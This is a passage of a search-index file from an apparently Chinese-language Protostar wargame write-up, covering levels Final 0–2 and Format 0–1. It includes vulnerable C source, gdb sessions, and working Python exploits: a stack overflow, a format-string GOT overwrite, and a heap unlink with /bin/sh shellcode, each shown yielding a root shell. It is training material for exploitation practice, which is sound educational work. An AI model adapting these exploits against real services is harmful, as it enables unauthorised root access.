0"},{"location":"wargames/protostar/final/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import struct , socket , telnetlib padding = 'a' * 512 + ' \\x00 ' * 4 + 'aaaabbbbccccdddd' s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2995 )) execve = struct . pack ( '<I' , 0x08048c0c ) binsh = struct . pack ( '<I' , 1176511 + 0xb7e97000 ) exploit = padding + execve + 'RETA' + binsh + ' \\x00 ' * 8 s . send ( exploit + ' \\n ' ) t = telnetlib . Telnet () t . sock = s t . interact () # \u4f7f\u7528 telnetlib \u5207\u6362\u5230\u4ea4\u4e92\u6a21\u5f0f 1 2 3 4 5 6 7 $ python final.py id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) whoami root exit *** Connection closed by remote host ***","title":"Exploit"},{"location":"wargames/protostar/final/#final-1","text":"The \u2018already written\u2019 bytes can be variable, and is based upon the length of the IP address and port number. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 #include \"../common/common.c\" #include <syslog.h> #define NAME \"final1\" #define UID 0 #define GID 0 #define PORT 2994 char username [ 128 ]; char hostname [ 64 ]; void logit ( char * pw ) { char buf [ 512 ]; snprintf ( buf , sizeof ( buf ), \"Login from %s as [%s] with password [%s] \\n \" , hostname , username , pw ); syslog ( LOG_USER | LOG_DEBUG , buf ); // void syslog(int priority, const char *format, ...); // buf is the format string! 0v0 } void trim ( char * str ) { char * q ; q = strchr ( str , '\\r' ); if ( q ) * q = 0 ; q = strchr ( str , '\\n' ); if ( q ) * q = 0 ; } void parser () { char line [ 128 ]; printf ( \"[final1] $ \" ); while ( fgets ( line , sizeof ( line ) -1 , stdin )) { trim ( line ); if ( strncmp ( line , \"username \" , 9 ) == 0 ) { strcpy ( username , line + 9 ); } else if ( strncmp ( line , \"login \" , 6 ) == 0 ) { if ( username [ 0 ] == 0 ) { printf ( \"invalid protocol \\n \" ); } else { logit ( line + 6 ); printf ( \"login failed \\n \" ); } } printf ( \"[final1] $ \" ); } } void getipport () { int l ; struct sockaddr_in sin ; // struct sockaddr_in { // sa_family_t sin_family; /* address family: AF_INET */ // in_port_t sin_port; /* port in network byte order */ // struct in_addr sin_addr; /* internet address */ // }; // /* Internet address. */ // struct in_addr { // uint32_t s_addr; /* address in network byte order */ // }; l = sizeof ( struct sockaddr_in ); // int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen); // getpeername() returns the address of the peer connected to the socket sockfd, in the buffer pointed to by addr. if ( getpeername ( 0 , & sin , & l ) == -1 ) { err ( 1 , \"you don't exist\" ); } sprintf ( hostname , \"%s:%d\" , inet_ntoa ( sin . sin_addr ), ntohs ( sin . sin_port )); } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); getipport (); parser (); } \u6b63\u786e\u4f7f\u7528 login \u540e\u53ef\u4ee5\u5728 /var/log/syslog \u4e2d\u770b\u5230\u767b\u5f55\u5c1d\u8bd5\u65e5\u5fd7 \u770b\u4e0a\u53bb\u4f3c\u4e4e\u6ca1\u6709\u53ef\u63a7\u5236\u7684 printf \uff0c\u4f46 syslog \u7c7b\u4f3c\u4e8e printf \uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u56e0\u800c\u53ef\u4ee5\u901a\u8fc7 username \u548c pw \u6765\u63a7\u5236\uff0c\u63a5\u4e0b\u6765\u53ef\u4ee5\u4fee\u6539 strncmp \u51fd\u6570 GOT \u8868\u7684\u6761\u76ee\u5730\u5740 \u83b7\u53d6 strncmp \u51fd\u6570 GOT \u8868\u7684\u6761\u76ee\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # gdb --pid `pidof final1` ( gdb ) info functions strncmp All functions matching regular expression \"strncmp\" : File strncmp.c: int *__GI_strncmp ( const char *, const char *, size_t ) ; File ../sysdeps/i386/i486/bits/string.h: int __strncmp_g ( const char *, const char *, size_t ) ; Non-debugging symbols: 0x08048d9c strncmp 0x08048d9c strncmp@plt Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) x/2i 0x08048d9c 0x8048d9c <strncmp@plt>: jmp *0x804a1a8 0x8048da2 <strncmp@plt+6>: push $0 x160 ( gdb ) x/wx 0x804a1a8 0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>: 0x08048da2 \u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 On a real modern system you would first have to leak addresses from memory in order to calculate offsets and break ASLR 1 2 ( gdb ) x system # part of libc 0xb7ecffb0 <__libc_system>: 0x890cec83 \u89c2\u5bdf\u8f93\u5165\u5b57\u7b26\u4e32\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e 1 2 3 4 5 $ nc 127 .0.0.1 2994 [ final1 ] $ username AAAA %x %x %x %x %x %x %x %x [ final1 ] $ login BBBB %x %x %x %x %x %x %x %x login failed [ final1 ] $ ^C \u6700\u77ed hostname \u4e3a x.x.x.x:x \uff08\u957f\u5ea6\u4e3a \\(9\\) \uff09\uff0c\u6700\u957f hostname \u4e3a xxx.xxx.xxx.xxx:xxxxx \uff08\u957f\u5ea6\u4e3a \\(21\\) \uff09\uff0c\u4e3a\u4e86\u5bf9\u9f50\uff0c\u9700\u8981\u8fdb\u884c\u586b\u5145\uff0c\u6839\u636e hostname \u7684\u957f\u5ea6\u8303\u56f4\u53ef\u4ee5\u7edf\u4e00\u586b\u5145\u5230 \\(24\\) \u5b57\u8282\uff0c\u8fd9\u6837\u4e00\u6765\u5c31\u53ef\u4ee5\u56fa\u5b9a\u5199\u5165\u7b2c \\(17\\) \u4e2a\u53c2\u6570\u6240\u6307\u5411\u7684\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import socket , struct def read_util ( check ): buf = '' while check not in buf : buf += s . recv ( 1 ) return buf s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2994 )) ip , port = s . getsockname () hostname = ip + ':' + str ( port ) # \u964d\u4f4e\u53d8\u957f hostname \u7684\u5f71\u54cd pad = 'A' * ( 24 - len ( hostname )) username = pad + 'BBBB' + ' %08x ' * 20 login = 'CCCC' print read_util ( '[final1] $' ) s . send ( 'username ' + username + ' \\n ' ) print read_util ( '[final1] $' ) s . send ( 'login ' + login + ' \\n ' ) print read_util ( '[final1] $' ) \u63a5\u4e0b\u6765\u67e5\u770b\u5df2\u6253\u5370\u5b57\u7b26\u6570\u91cf\uff0c\u5e76\u786e\u5b9a\u5269\u4f59\u9700\u8981\u5b57\u7b26\u7684\u6570\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import socket , struct def read_util ( check ): buf = '' while check not in buf : buf += s . recv ( 1 ) return buf s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2994 )) strncmp = struct . pack ( 'I' , 0x804a1a8 ) ip , port = s . getsockname () hostname = ip + ':' + str ( port ) pad = 'A' * ( 24 - len ( hostname )) username = pad + 'BBBB' + strncmp + '%18$n' login = 'CCCC' print read_util ( '[final1] $' ) s . send ( 'username ' + username + ' \\n ' ) print read_util ( '[final1] $' ) s . send ( 'login ' + login + ' \\n ' ) print read_util ( '[final1] $' ) raw_input ( 'waiting... hit [enter]' ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ python final.py [ final1 ] $ [ final1 ] $ login failed [ final1 ] $ waiting... hit [ enter ] # open another terminal # pidof final1 21600 1516 # gdb --pid 21600 ( gdb ) x/wx 0x804a1a8 0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>: 0x00000030 Current language: auto The current source language is \"auto; currently asm\" .","title":"Final 1"},{"location":"wargames/protostar/final/#exploit_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import socket , struct , telnetlib def read_util ( check ): buf = '' while check not in buf : buf += s . recv ( 1 ) return buf s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2994 )) strncmp_got = 0x804a1a8 ip , port = s . getsockname () hostname = ip + ':' + str ( port ) pad = 'A' * ( 24 - len ( hostname )) username = pad + struct . pack ( 'I' , strncmp_got ) + struct . pack ( 'I' , strncmp_got + 2 ) + ' %65408x ' + '%17$n' + ' %47164x ' + '%18$n' # 65408 = 0xffb0 - 0x30 # 47164 = 0xb7ec - 0xffb0 login = 'CCCC' print read_util ( '[final1] $' ) s . send ( 'username ' + username + ' \\n ' ) print read_util ( '[final1] $' ) s . send ( 'login ' + login + ' \\n ' ) print read_util ( '[final1] $' ) t = telnetlib . Telnet () t . sock = s t . interact () 1 2 3 4 5 6 7 8 9 $ python final.py [ final1 ] $ [ final1 ] $ login failed [ final1 ] $ id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) [ final1 ] $ whoami root","title":"Exploit"},{"location":"wargames/protostar/final/#final-2","text":"Remote heap level :) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 #include \"../common/common.c\" #include \"../common/malloc.c\" #define NAME \"final2\" #define UID 0 #define GID 0 #define PORT 2993 #define REQSZ 128 void check_path ( char * buf ) { char * start ; char * p ; int l ; /* * Work out old software bug */ p = rindex ( buf , '/' ); // index, rindex - locate character in string // The rindex() function returns a pointer to the last occurrence of the character c in the string s. l = strlen ( p ); if ( p ) { start = strstr ( buf , \"ROOT\" ); // strstr - locate a substring if ( start ) { while ( * start != '/' ) start -- ; // \u5e76\u4e0d\u68c0\u67e5\u662f\u5426\u5728\u5b57\u7b26\u4e32\u5185 memmove ( start , p , l ); // void *memmove(void *dest, const void *src, size_t n); printf ( \"moving from %p to %p (exploit: %s / %d) \\n \" , p , start , start < buf ? \"yes\" : \"no\" , start - buf ); } } } int get_requests ( int fd ) { char * buf ; char * destroylist [ 256 ]; int dll ; int i ; dll = 0 ; while ( 1 ) { if ( dll >= 255 ) break ; buf = calloc ( REQSZ , 1 ); // 128 bytes, the chunk size is bigger than MAX_FAST_SIZE(80) if ( read ( fd , buf , REQSZ ) != REQSZ ) break ; if ( strncmp ( buf , \"FSRD\" , 4 ) != 0 ) break ; check_path ( buf + 4 ); dll ++ ; } for ( i = 0 ; i < dll ; i ++ ) { write ( fd , \"Process OK \\n \" , strlen ( \"Process OK \\n \" )); free ( destroylist [ i ]); // \u6309\u5206\u914d\u7684\u987a\u5e8f\u91ca\u653e } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); /* Wait for socket activity and return */ fd = serve_forever ( PORT ); /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); get_requests ( fd ); } \u8f93\u5165\u5b57\u7b26\u4e32\u5e94\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u4ee5 FSRD \u5f00\u5934\uff0c\u603b\u957f\u5ea6\u4e3a 128 \u5b57\u8282 \u5305\u542b / \u548c\u5b50\u4e32 ROOT \u5728\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55/\u5f53\u524d\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u521b\u5efa .gdbinit \uff0c\u5199\u5165\u6bcf\u6b21\u542f\u52a8 gdb \u65f6\u5e0c\u671b\u6267\u884c\u7684\u547d\u4ee4 1 2 set disassembly-flavor intel set pagination off \u91cd\u70b9\u5173\u6ce8 check_path \uff0c\u5229\u7528 / \u67e5\u627e\u548c memmove \u4fee\u6539\u5806\uff0c\u5e76\u501f\u52a9 free \u5b8c\u6210 unlink \u653b\u51fb Dump of assembler code for function check_path 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 0x0804bcd0 <check_path+0>: push ebp 0x0804bcd1 <check_path+1>: mov ebp,esp 0x0804bcd3 <check_path+3>: sub esp,0x28 0x0804bcd6 <check_path+6>: mov DWORD PTR [ esp+0x4 ] ,0x2f 0x0804bcde <check_path+14>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bce1 <check_path+17>: mov DWORD PTR [ esp ] ,eax 0x0804bce4 <check_path+20>: call 0x8048f7c <rindex@plt> 0x0804bce9 <check_path+25>: mov DWORD PTR [ ebp-0x10 ] ,eax 0x0804bcec <check_path+28>: mov eax,DWORD PTR [ ebp-0x10 ] 0x0804bcef <check_path+31>: mov DWORD PTR [ esp ] ,eax 0x0804bcf2 <check_path+34>: call 0x8048edc <strlen@plt> 0x0804bcf7 <check_path+39>: mov DWORD PTR [ ebp-0xc ] ,eax 0x0804bcfa <check_path+42>: cmp DWORD PTR [ ebp-0x10 ] ,0x0 0x0804bcfe <check_path+46>: je 0x804bd45 <check_path+117> 0x0804bd00 <check_path+48>: mov DWORD PTR [ esp+0x4 ] ,0x804c2cc 0x0804bd08 <check_path+56>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bd0b <check_path+59>: mov DWORD PTR [ esp ] ,eax 0x0804bd0e <check_path+62>: call 0x8048f4c <strstr@plt> 0x0804bd13 <check_path+67>: mov DWORD PTR [ ebp-0x14 ] ,eax 0x0804bd16 <check_path+70>: cmp DWORD PTR [ ebp-0x14 ] ,0x0 0x0804bd1a <check_path+74>: je 0x804bd45 <check_path+117> 0x0804bd1c <check_path+76>: jmp 0x804bd22 <check_path+82> 0x0804bd1e <check_path+78>: sub DWORD PTR [ ebp-0x14 ] ,0x1 0x0804bd22 <check_path+82>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bd25 <check_path+85>: movzx eax,BYTE PTR [ eax ] 0x0804bd28 <check_path+88>: cmp al,0x2f 0x0804bd2a <check_path+90>: jne 0x804bd1e <check_path+78> 0x0804bd2c <check_path+92>: mov eax,DWORD PTR [ ebp-0xc ] 0x0804bd2f <check_path+95>: mov DWORD PTR [ esp+0x8 ] ,eax 0x0804bd33 <check_path+99>: mov eax,DWORD PTR [ ebp-0x10 ] 0x0804bd36 <check_path+102>: mov DWORD PTR [ esp+0x4 ] ,eax 0x0804bd3a <check_path+106>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bd3d <check_path+109>: mov DWORD PTR [ esp ] ,eax 0x0804bd40 <check_path+112>: call 0x8048f8c <memmove@plt> 0x0804bd45 <check_path+117>: leave 0x0804bd46 <check_path+118>: ret \u67e5\u770b\u5806\u7684\u8d77\u59cb\u5730\u5740 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 # gdb -p 1497 Attaching to process 1497 ( gdb ) set follow-fork-mode child Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) break *0x0804bd40 Breakpoint 1 at 0x804bd40: file final2/final2.c, line 27 . ( gdb ) c Continuing. [ New process 1743 ] [ Switching to process 1743 ] Breakpoint 1 , 0x0804bd40 in check_path ( buf = 0x804e00c \"AAAA/ROOT/BBBB/CCCC\" ) at final2/final2.c:27 Current language: auto The current source language is \"auto; currently c\" . ( gdb ) info proc mappings process 1743 cmdline = '/opt/protostar/bin/final2' cwd = '/' exe = '/opt/protostar/bin/final2' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804d000 0x5000 0 /opt/protostar/bin/final2 0x804d000 0x804e000 0x1000 0x4000 /opt/protostar/bin/final2 0x804e000 0x804f000 0x1000 0 [ heap ] 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] \u56e0\u4e3a\u672c\u8eab\u5206\u914d\u7684 chunk \u5927\u5c0f\u5373\u5927\u4e8e MAX_FAST_SIZE \uff0c\u56e0\u800c\u5728\u91ca\u653e\u7b2c\u4e00\u4e2a chunk \u65f6\uff0c\u82e5\u4e0b\u4e00\u4e2a chunk \u672a\u88ab\u4f7f\u7528\uff0c\u5c06\u8fdb\u884c unlink \uff0c\u5229\u7528\u51fd\u6570 check_path \u4fee\u6539\u7b2c\u4e8c\u4e2a chunk \u5728\u6267\u884c free \u4e4b\u540e\uff0c\u53ef\u4f5c\u4e3a\u4fee\u6539 GOT \u8868\u6761\u76ee\u7684\u76ee\u6807\u51fd\u6570\u4e3a write \u548c strlen \uff08\u9009\u62e9 write \uff09 Dump of assembler code for function get_requests 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 0x0804bd47 <get_requests+0>: push ebp 0x0804bd48 <get_requests+1>: mov ebp,esp 0x0804bd4a <get_requests+3>: sub esp,0x428 0x0804bd50 <get_requests+9>: mov DWORD PTR [ ebp-0x10 ] ,0x0 0x0804bd57 <get_requests+16>: cmp DWORD PTR [ ebp-0x10 ] ,0xfe 0x0804bd5e <get_requests+23>: jg 0x804bddb <get_requests+148> 0x0804bd60 <get_requests+25>: mov DWORD PTR [ esp+0x4 ] ,0x1 0x0804bd68 <get_requests+33>: mov DWORD PTR [ esp ] ,0x80 0x0804bd6f <get_requests+40>: call 0x804b4ee <calloc> 0x0804bd74 <get_requests+45>: mov DWORD PTR [ ebp-0x14 ] ,eax 0x0804bd77 <get_requests+48>: mov eax,DWORD PTR [ ebp-0x10 ] 0x0804bd7a <get_requests+51>: mov edx,DWORD PTR [ ebp-0x14 ] 0x0804bd7d <get_requests+54>: mov DWORD PTR [ ebp+eax*4-0x414 ] ,edx 0x0804bd84 <get_requests+61>: add DWORD PTR [ ebp-0x10 ] ,0x1 0x0804bd88 <get_requests+65>: mov DWORD PTR [ esp+0x8 ] ,0x80 0x0804bd90 <get_requests+73>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bd93 <get_requests+76>: mov DWORD PTR [ esp+0x4 ] ,eax 0x0804bd97 <get_requests+80>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bd9a <get_requests+83>: mov DWORD PTR [ esp ] ,eax 0x0804bd9d <get_requests+86>: call 0x8048e5c <read@plt> 0x0804bda2 <get_requests+91>: cmp eax,0x80 0x0804bda7 <get_requests+96>: jne 0x804bdde <get_requests+151> 0x0804bda9 <get_requests+98>: mov DWORD PTR [ esp+0x8 ] ,0x4 0x0804bdb1 <get_requests+106>: mov DWORD PTR [ esp+0x4 ] ,0x804c2d1 0x0804bdb9 <get_requests+114>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bdbc <get_requests+117>: mov DWORD PTR [ esp ] ,eax 0x0804bdbf <get_requests+120>: call 0x8048fdc <strncmp@plt> 0x0804bdc4 <get_requests+125>: test eax,eax 0x0804bdc6 <get_requests+127>: jne 0x804bde1 <get_requests+154> 0x0804bdc8 <get_requests+129>: mov eax,DWORD PTR [ ebp-0x14 ] 0x0804bdcb <get_requests+132>: add eax,0x4 0x0804bdce <get_requests+135>: mov DWORD PTR [ esp ] ,eax 0x0804bdd1 <get_requests+138>: call 0x804bcd0 <check_path> 0x0804bdd6 <get_requests+143>: jmp 0x804bd57 <get_requests+16> 0x0804bddb <get_requests+148>: nop 0x0804bddc <get_requests+149>: jmp 0x804bde2 <get_requests+155> 0x0804bdde <get_requests+151>: nop 0x0804bddf <get_requests+152>: jmp 0x804bde2 <get_requests+155> 0x0804bde1 <get_requests+154>: nop 0x0804bde2 <get_requests+155>: mov DWORD PTR [ ebp-0xc ] ,0x0 0x0804bde9 <get_requests+162>: jmp 0x804be1c <get_requests+213> 0x0804bdeb <get_requests+164>: mov DWORD PTR [ esp+0x8 ] ,0xb 0x0804bdf3 <get_requests+172>: mov DWORD PTR [ esp+0x4 ] ,0x804c2d6 0x0804bdfb <get_requests+180>: mov eax,DWORD PTR [ ebp+0x8 ] 0x0804bdfe <get_requests+183>: mov DWORD PTR [ esp ] ,eax 0x0804be01 <get_requests+186>: call 0x8048dfc <write@plt> 0x0804be06 <get_requests+191>: mov eax,DWORD PTR [ ebp-0xc ] 0x0804be09 <get_requests+194>: mov eax,DWORD PTR [ ebp+eax*4-0x414 ] 0x0804be10 <get_requests+201>: mov DWORD PTR [ esp ] ,eax 0x0804be13 <get_requests+204>: call 0x804a9c2 <free> 0x0804be18 <get_requests+209>: add DWORD PTR [ ebp-0xc ] ,0x1 0x0804be1c <get_requests+213>: mov eax,DWORD PTR [ ebp-0xc ] 0x0804be1f <get_requests+216>: cmp eax,DWORD PTR [ ebp-0x10 ] 0x0804be22 <get_requests+219>: jl 0x804bdeb <get_requests+164> 0x0804be24 <get_requests+221>: leave 0x0804be25 <get_requests+222>: ret 1 2 3 4 ( gdb ) x/i 0x8048dfc 0x8048dfc <write@plt>: jmp DWORD PTR ds:0x804d41c ( gdb ) x/wx 0x804d41c 0x804d41c <_GLOBAL_OFFSET_TABLE_+64>: 0xb7f53c70 \u4e0e Heap 3 \u4e0d\u540c\uff0c\u9700\u8981\u83b7\u5f97 shell\uff0c\u53c8\u56e0\u4e3a\u6709 BK->fd \u5199\u56de\uff0c \\(8\\) \u5b57\u8282\u4e0d\u8db3\u4ee5\u653e\u4e0b\u6240\u6709 shellcode\uff0c\u53ef\u5229\u7528 jmp \uff0c\u4f7f\u7528 Online Assembler and Disassembler \u8f6c\u6362\u4e3a shellcode 1 2 # jmp 0xc \\x eb \\x 0a","title":"Final 2"},{"location":"wargames/protostar/final/#exploit_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import socket , struct , telnetlib REQSZ = 128 def pad ( m ): return ( 'FSRD' + m ) . ljust ( REQSZ , ' \\x00 ' )[: REQSZ ] s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s . connect (( 'localhost' , 2993 )) jmp = \" \\xeb\\x0a \" shellcode = \" \\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80 \" s . send ( pad ( '/ROOT' + '/' * 0xf + jmp + ' \\x90 ' * 0xa + shellcode + '/' * 0x80 )) fake_chunk = struct . pack ( \"I\" , 0xfffffffc ) * 2 + struct . pack ( \"I\" , 0x804d41c - 0xc ) + struct . pack ( \"I\" , 0x804e020 ) s . send ( pad ( 'ROOT/' + fake_chunk )) t = telnetlib . Telnet () t . sock = s t . interact () 1 2 3 4 5 6 7 8 9 $ python final.py Process OK id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) whoami root exit *** Connection closed by remote host ***","title":"Exploit"},{"location":"wargames/protostar/format/","text":"The levels to be exploited can be found in the /opt/protostar/bin directory. Format 0 \u00b6 This level should be done in less than 10 bytes of input 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void vuln ( char * string ) { volatile int target ; char buffer [ 64 ]; target = 0 ; sprintf ( buffer , string ); // int sprintf(char *str, const char *format, ...); if ( target == 0xdeadbeef ) { printf ( \"you have hit the target correctly :) \\n \" ); } } int main ( int argc , char ** argv ) { vuln ( argv [ 1 ]); } \u9996\u5148\u8fd8\u662f\u6d4b\u4e00\u4e0b\u9700\u8981\u8986\u76d6\u7684\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 $ gdb ./format0 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble vuln Dump of assembler code for function vuln: 0x080483f4 <vuln+0>: push ebp 0x080483f5 <vuln+1>: mov ebp,esp 0x080483f7 <vuln+3>: sub esp,0x68 0x080483fa <vuln+6>: mov DWORD PTR [ ebp-0xc ] ,0x0 0x08048401 <vuln+13>: mov eax,DWORD PTR [ ebp+0x8 ] 0x08048404 <vuln+16>: mov DWORD PTR [ esp+0x4 ] ,eax 0x08048408 <vuln+20>: lea eax, [ ebp-0x4c ] 0x0804840b <vuln+23>: mov DWORD PTR [ esp ] ,eax 0x0804840e <vuln+26>: call 0x8048300 <sprintf@plt> 0x08048413 <vuln+31>: mov eax,DWORD PTR [ ebp-0xc ] 0x08048416 <vuln+34>: cmp eax,0xdeadbeef 0x0804841b <vuln+39>: jne 0x8048429 <vuln+53> 0x0804841d <vuln+41>: mov DWORD PTR [ esp ] ,0x8048510 0x08048424 <vuln+48>: call 0x8048330 <puts@plt> 0x08048429 <vuln+53>: leave 0x0804842a <vuln+54>: ret End of assembler dump. ( gdb ) break *0x0804840e ( gdb ) define hook-stop Type commands for definition of \"hook-stop\" . End with a line saying just \"end\" . >x/1i $eip >end ( gdb ) r $( cat /tmp/test ) Starting program: /opt/protostar/bin/format0 $( cat /tmp/test ) 0x804840e <vuln+26>: call 0x8048300 <sprintf@plt> Breakpoint 1 , 0x0804840e in vuln ( string = 0xbffff84b \"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ\" ) at format0/format0.c:13 13 in format0/format0.c ( gdb ) ni 0x8048413 <vuln+31>: mov eax,DWORD PTR [ ebp-0xc ] 15 in format0/format0.c ( gdb ) si 0x8048416 <vuln+34>: cmp eax,0xdeadbeef 0x08048416 15 in format0/format0.c ( gdb ) info registers eax 0x51515151 1364283729 # Q ... sprintf \u5e76\u4e0d\u4f1a\u68c0\u67e5\u683c\u5f0f\u5b57\u7b26\u4e32\u9700\u8981\u7684\u53c2\u6570\u4e0e\u5b9e\u9645\u63d0\u4f9b\u7684\u53c2\u6570\u662f\u5426\u5339\u914d\uff0c\u53ea\u662f\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u4ece\u6808\u4e2d\u53d6\u53c2\u6570 Exploit \u00b6 1 2 3 import struct target = struct . pack ( 'I' , 0xdeadbeef ) print ' %64s ' + target 1 2 $ ./format0 $( python /tmp/format.py ) you have hit the target correctly : ) Format 1 \u00b6 modify arbitrary memory locations 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int target ; void vuln ( char * string ) { printf ( string ); if ( target ) { printf ( \"you have modified the target :) \\n \" ); } } int main ( int argc , char ** argv ) { vuln ( argv [ 1 ]); } printf \u4e0e sprintf \u7c7b\u4f3c\uff0c\u53ea\u662f\u6839\u636e\u683c\u5f0f\u5b57\u7b26\u4e32\u4ece\u6808\u4e2d\u53d6\u53c2\u6570 \u53ef\u7528\u4e8e\u67e5\u770b\u5185\u5b58\u4fe1\u606f man 3 printf Code such as printf(foo); If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole. %n \u7528\u4e8e\u5c06\u5148\u524d\u5df2\u7ecf\u6253\u5370\u7684\u5b57\u7b26\u6570\u91cf\u5b58\u50a8\u4e8e\u6307\u9488\u6307\u5411\u7684\u6574\u578b\u53d8\u91cf \u83b7\u53d6\u53d8\u91cf target \u7684\u5730\u5740 1 2 $ objdump -t format1 | grep target 08049638 g O .bss 00000004 target \u51fd\u6570\u53c2\u6570\u5c06\u538b\u5165\u6808\u4e2d\uff0c\u82e5 08049638 \u65e0\u6cd5\u76f4\u63a5\u5728\u6808\u4e0a\u627e\u5230\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f20\u53c2\u63a7\u5236 \u4e0d\u540c\u957f\u5ea6\u7684\u4f20\u53c2\u4e5f\u5f71\u54cd\u7740\u6808\uff0c\u9700\u8981\u5c1d\u8bd5\u4e0d\u540c\u7684\u957f\u5ea6\u4f7f\u5f97 ESP \u4e0e\u5b57\u7b26\u4e32\u8d77\u59cb\u5730\u5740\u7684\u5dee\u503c\u4e3a \\(4\\) \u7684\u500d\u6570\uff0c\u4ece\u800c\u80fd\u6070\u597d\u8bfb\u5230 08049638 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 $ gdb ./format1 ( gdb ) set disassembly-flavor intel ( gdb 